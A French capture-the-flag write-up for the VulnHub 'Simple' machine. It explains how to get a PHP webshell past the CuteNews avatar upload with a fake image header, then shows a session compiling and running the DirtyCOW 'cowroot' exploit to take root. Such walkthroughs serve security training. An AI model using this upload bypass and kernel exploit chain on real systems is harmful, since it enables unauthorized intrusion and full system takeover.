# Solution du CTF SecTalks: BNE0x03 - Simple de VulnHub

[SecTalks: BNE0x03 - Simple](https://vulnhub.com/entry/sectalks-bne0x03-simple,141/) est un boot2root avec plusieurs indices que les habitués des CTFs pourront tout à fait ignorer :

> 1. Get a user shell by uploading a reverse shell and executing it.
> 2. A proxy may help you to upload the file you want, rather than the file that the server expects.
> 3. There are 3 known privesc exploits that work. Some people have had trouble executing one of them unless it was over a reverse shell using a netcat listener.

```
Nmap scan report for 192.168.56.104
Host is up (0.00013s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Please Login / CuteNews
|_http-server-header: Apache/2.4.7 (Ubuntu)
```

Ce début de CTF est exactement le même scénario que sur le CTF [Cute](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Cute%20de%20VulnHub.md) : on dispose d'une appli web `CuteNews` sur laquelle il est possible de s'enregistrer et déposer un shell PHP via la fonctionnalité l'upload d'avatar pour peu que notre script PHP ait un entête d'image valide pour passer les vérifications.

On obtient alors un webshell avec les droits `www-data`.

On obtient ensuite un shell interactif via l'upload et l'exécution d'un reverse-ssh.

Une recherche de vulnérabilités via `LinPEAS` remonte `DirtyCOW` comme étant la meilleure solution pour une escalade de privilèges. On s'exécute donc :

```shellsession
www-data@simple:/var/www/html/uploads$ gcc -o cowroot cowroot.c 
gcc: error trying to exec 'cc1': execvp: No such file or directory
www-data@simple:/var/www/html/uploads$ find / -name cc1 2> /dev/null 
/usr/lib/gcc/i686-linux-gnu/4.8/cc1
www-data@simple:/var/www/html/uploads$ export PATH=/usr/lib/gcc/i686-linux-gnu/4.8/cc1:$PATH
www-data@simple:/var/www/html/uploads$ gcc -o cowroot cowroot.c
cowroot.c: In function 'procselfmemThread':
cowroot.c:98:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
         lseek(f,map,SEEK_SET);
         ^
In file included from cowroot.c:27:0:
/usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
cowroot.c: In function 'main':
cowroot.c:141:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
     printf("Size of binary: %d\n", st.st_size);
     ^
/tmp/ccVwkde8.o: In function `main':
cowroot.c:(.text+0x368): undefined reference to `pthread_create'
cowroot.c:(.text+0x38b): undefined reference to `pthread_create'
cowroot.c:(.text+0x3af): undefined reference to `pthread_create'
cowroot.c:(.text+0x3c4): undefined reference to `pthread_join'
collect2: error: ld returned 1 exit status
www-data@simple:/var/www/html/uploads$ gcc -o cowroot cowroot.c -lpthread
cowroot.c: In function 'procselfmemThread':
cowroot.c:98:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
         lseek(f,map,SEEK_SET);
         ^
In file included from cowroot.c:27:0:
/usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
cowroot.c: In function 'main':
cowroot.c:141:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
     printf("Size of binary: %d\n", st.st_size);
     ^
www-data@simple:/var/www/html/uploads$ ./cowroot 
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 45420
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
root@simple:/var/www/html/uploads# id
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
root@simple:/var/www/html/uploads# cd /root
root@simple:/root# ls
flag.txt
root@simple:/root# cat flag.txt
U wyn teh Interwebs!!1eleven11!!1!
Hack the planet!
```

*Publié le 3 janvier 2023*
